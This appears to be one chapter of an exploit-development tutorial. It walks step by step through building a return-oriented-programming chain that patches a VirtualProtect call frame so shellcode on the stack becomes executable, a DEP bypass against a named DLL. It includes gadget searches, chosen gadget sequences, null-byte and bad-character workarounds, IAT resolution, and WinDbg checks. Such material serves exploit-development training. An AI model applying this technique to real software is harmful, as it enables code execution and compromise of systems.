## 9. Building the VirtualProtect chain, primitive by primitive

Throughout, symbolic names like `G_POP_EAX` refer to rows in the **Gadget Table
(Appendix A)** that you fill from *your* `rop.txt`. Reference-build addresses are
shown for concreteness and are labelled `[ref]`.

### P0 — Acquire a stack pointer

**Problem.** We must write six dwords into the fake frame at known stack
addresses. ESP points near them, but we may never clobber ESP (it must keep
pointing at the next gadget). So copy ESP into a register we *can* mangle. Later
primitives store with `mov [esi], eax`, so the pointer should end up in **ESI**.

**Search.**

```
findstr /C:"mov esi, esp" rop.txt
findstr /C:"push esp" rop.txt
```

**Candidates.**

```
A)  push esp ; push eax ; pop edi ; pop esi ; ret      ← ends in ret, ESP→ESI
B)  mov esi, esp ; call eax                             ← REJECT: call breaks chain
C)  push esp ; pop esi ; jmp eax                        ← REJECT: jmp breaks chain
D)  mov esi, esp ; pop ebp ; ret                        ← clean, if present
```

**Rejections.** B ends in `call eax` — execution leaves the chain to wherever EAX
points; we lose control. C ends in `jmp eax` — same problem. Any gadget not
ending in `ret` (or an equivalent controlled return) is disqualified no matter
how perfect its first instruction.

**Chosen.** `A` if `D` isn't available. Walk `A`: `push esp` puts ESP on top;
`push eax` pushes below it; `pop edi` discards EAX-value into EDI; `pop esi`
lands the original ESP into ESI. Net: `ESI = ESP`, and it returns cleanly.

```
eip = pack("<L", G_STACKPTR)     # push esp ; push eax ; pop edi ; pop esi ; ret   [ref] 0x6150__
```

> **Verify in WinDbg.** `bp <G_STACKPTR>`, `g`, single-step to the `ret`, then
> `r esi` — ESI should equal the ESP value at entry. Confirm `dds esi` shows your
> `C`-filler, i.e. ESI points into controllable stack.

### P1 — Resolve VirtualProtect from the IAT

**Problem.** VP's runtime address changes every boot; you cannot hardcode it. But
`compression.dll` imports VP, so the **IAT slot** holding VP's address sits at a
fixed offset in the (non-ASLR) module. Find it once and dereference at runtime.

Find the slot:

```
0:000> dps compression!_imp__VirtualProtect L1
615__XXX  76xxxxxx  KERNEL32!VirtualProtectStub
```

or in IDA: Imports → VirtualProtect → note the IAT address, e.g.
`0x6150A220 [ref]`.

**The bad-char snag.** Suppose the slot is `0x6150A220` — it contains `0x20`
(space), a bad char. Standard fix: ship `slot+1 = 0x6150A221`, load it, then
subtract 1 with a gadget to recover the real slot before dereferencing.

**Search & candidates.**

```
findstr /C:": pop eax ; ret" rop.txt          → G_POP_EAX
findstr /C:": pop ecx ; ret" rop.txt           → G_POP_ECX
findstr /C:": add eax, ecx ; ret" rop.txt      → G_ADD_EAX_ECX
findstr /C:": mov eax, dword [eax] ; ret" rop.txt  → G_DEREF_EAX
```

Reject any `pop eax` variant whose gadget also does something destructive before
the `ret` (e.g. `pop eax ; pop esp ; ret` — clobbers ESP), and any deref gadget
that indexes a register you can't control.

**Chosen sequence.**

```
G_POP_EAX        ; eax = 0x6150A221   (IAT slot + 1, dodges 0x20)
G_POP_ECX        ; ecx = 0xFFFFFFFF   (-1)
G_ADD_EAX_ECX    ; eax = 0x6150A220   (real IAT slot)
G_DEREF_EAX      ; eax = [slot] = &VirtualProtect   ← runtime address resolved
```

> **Verify in WinDbg.** Break after `G_DEREF_EAX`; `u eax L1` should disassemble
> as `KERNEL32!VirtualProtectStub`. If EAX is garbage, your IAT slot or the ±1
> correction is wrong.

### P2 — Store the API address into the frame

**Problem.** EAX now holds `&VirtualProtect`. Write it over the `&VirtualProtect`
placeholder in the fake frame. We need the store primitive and ESI aimed at the
placeholder slot.

**The store primitive (used in P2–P7):**

```
findstr /C:": mov dword [esi], eax ; ret" rop.txt   → G_STORE   [ref] 0x6150CBB6
```

**Aligning ESI.** In P0, ESI = ESP. The fake frame's first slot (`&VP`) sits at a
known offset from ESP (you laid it out; e.g. the placeholder is at `ESP-0x1C`
because you put the frame *before* the chain — exact number from your layout).
To move ESI to it without null bytes, add a negative:

```
G_MOV_EAX_ESI    ; eax = esi            (get a working copy; e.g. "mov eax,esi ; pop esi ; ret")
G_POP_ECX        ; ecx = 0xFFFFFFE4     (-0x1C, null-free)
G_ADD_EAX_ECX    ; eax = &placeholder
G_PUSH_EAX_POP_ESI ; esi = &placeholder ("push eax ; pop esi ; ret")
```

Then, after P1 has resolved VP into EAX again (order your chain so the resolved
value is in EAX when you store — see Appendix B for the exact interleaving):

```
G_STORE          ; [esi] = eax  → placeholder replaced with &VirtualProtect
```

> **Verify in WinDbg — watch the placeholder disappear.**
> ```
> before:  dds esi L1   →  615..  45454545     (placeholder)
> after :  dds esi L1   →  615..  76xxxxxx  KERNEL32!VirtualProtectStub
> ```
> This before/after is the single most satisfying checkpoint in the chain.

### P3 / P4 — Store return address and lpAddress (both = shellcode)

**Problem.** The shellcode will sit *after* the ROP chain, whose length isn't
final until the chain is done — chicken and egg. Solve with a placeholder offset
from ESI you finalise last.

Advance ESI to the return-address slot (4 bytes on): no `add esi,4` gadget?
Use an `inc esi` gadget repeated 4×. Ours has a harmless side effect:

```
findstr /C:": inc esi" rop.txt
    G_INC_ESI  =  inc esi ; add al, 2Bh ; ret     ← ugly, side-effects AL only
```

> **Design decision — ugly gadgets are fine.** `inc esi ; add al,0x2B ; ret` is
> not clean, but the only register it dirties (AL) is one we don't rely on at
> this point. Reject a gadget for *harmful* side effects, not cosmetic ones.
> Chasing the mythical perfect `add esi,4 ; ret` wastes time; this works.

Then compute `ESI + delta` into EAX to point at the (future) shellcode and store:

```
G_INC_ESI ×4                              ; ESI → return-address slot
G_MOV_EAX_ESI                             ; eax = esi
G_PUSH_EAX_POP_ESI (restore later) / arithmetic to add shellcode delta
G_POP_ECX ; 0xFFFFFDF0  (-0x210, null-free placeholder delta)
G_SUB_EAX_ECX  (or add of a negative)     ; eax = shellcode addr (approx)
G_STORE                                   ; [esi] = shellcode addr  (return address)
```

P4 (`lpAddress`) is the *same value* one slot further on: `inc esi ×4`, recompute
(delta now `-0x20C` because ESI advanced 4), `G_STORE`. Finalise the `-0x210` /
`-0x20C` magic numbers in Chapter 11 once the chain length is frozen.

> **Verify.** After P3, `dds` the return-address slot: the `46464646` placeholder
> becomes a stack address inside your buffer. After P4, the `lpAddress` slot
> equals the return-address slot — VP's target page and its return target are the
> same page (correct: we execute the shellcode we just made executable).

### P5 — Store dwSize (0x201)

**Problem.** `0x00000201` has null bytes. Synthesize it null-free.

> **Design decision — which trick?** Three options for building a
> null-containing constant: (a) `neg` of its two's-complement if *that* is
> null-free; (b) split into two null-free addends; (c) build with
> `xor`/`inc`. For `0x201`: `-0x201 = 0xFFFFFDFF` (null-free) → `pop eax ;
> 0xFFFFFDFF ; neg eax` yields `0x201`. One pop, one neg. Choose (a).

```
G_INC_ESI ×4                 ; ESI → dwSize slot
G_POP_EAX ; 0xFFFFFDFF        ; -0x201
G_NEG_EAX                     ; eax = 0x201
G_STORE                       ; [esi] = 0x201
```

(`0x201` > `0x200` avoids a trailing `0x00` low byte you'd get from `0x200`; and
one page of RWX easily covers our shellcode.)

### P6 — Store flNewProtect (0x40)

**Problem.** `0x40` alone is fine, but `0x00000040` as a dword has nulls; and its
two's complement `0xFFFFFFC0` is null-free — so `neg` works again. But let's use
this primitive to teach the **split-add** trick you'll need elsewhere:

```
0x40 = 0x80808080 + 0x7F7F7FC0     (both operands null-free; 32-bit wrap discards carry)
```

```
G_INC_ESI ×4                 ; ESI → flNewProtect slot
G_POP_EAX ; 0x80808080
G_POP_ECX ; 0x7F7F7FC0
G_ADD_EAX_ECX                ; eax = 0x40
G_STORE                      ; [esi] = 0x40  (PAGE_EXECUTE_READWRITE)
```

> **Verify.** `? 80808080 + 7f7f7fc0` in WinDbg → `...00000040`. Watch the
> `51515151` placeholder become `00000040`.

### P7 — Store lpflOldProtect (writable scratch pointer)

**Problem.** VP writes the old protection to `*lpflOldProtect`; the pointer must
be writable. Any stable writable stack dword works. The simplest source: a stack
address we already hold. Reuse ESI-arithmetic to point at a dword we don't care
about (e.g. a slot below our frame that holds filler), and store *that address*
as the argument.

```
G_INC_ESI ×4                 ; ESI → lpflOldProtect slot
G_MOV_EAX_ESI                ; eax = esi (some nearby writable stack addr)
G_POP_ECX ; <null-free delta to a scratch dword>
G_ADD_EAX_ECX                ; eax = &scratch (writable)
G_STORE                      ; [esi] = &scratch
```

> **Design decision.** VirtualProtect's `lpflOldProtect` is the one extra
> argument VirtualAlloc doesn't need. Beginners pass leftover `0x51515151` and
> get an access violation *inside* VP — a confusing crash that looks like the
> chain failed. It didn't; you handed VP an unwritable pointer. Always give it
> real writable storage.

### Chain assembly so far

You now have all six frame fields patched at runtime and a resolved API address.
The frame in memory has transformed from placeholders to a live VirtualProtect
call:

```
BEFORE (as shipped)          AFTER (post-ROP)
45454545  &VP placeholder →  76xxxxxx  KERNEL32!VirtualProtect
46464646  retaddr        →  0133e5xx  (shellcode on stack)
47474747  lpAddress      →  0133e5xx  (same page as retaddr)
48484848  dwSize         →  00000201
51515151  flNewProtect   →  00000040
52525252  lpflOldProtect →  0133e2xx  (writable scratch)
```

Only one thing remains: point ESP at `&VP` and return.

---

---

[← Previous](08-strategy.md) · [Index](00-index.md) · [Next →](10-firing-and-discipline.md)
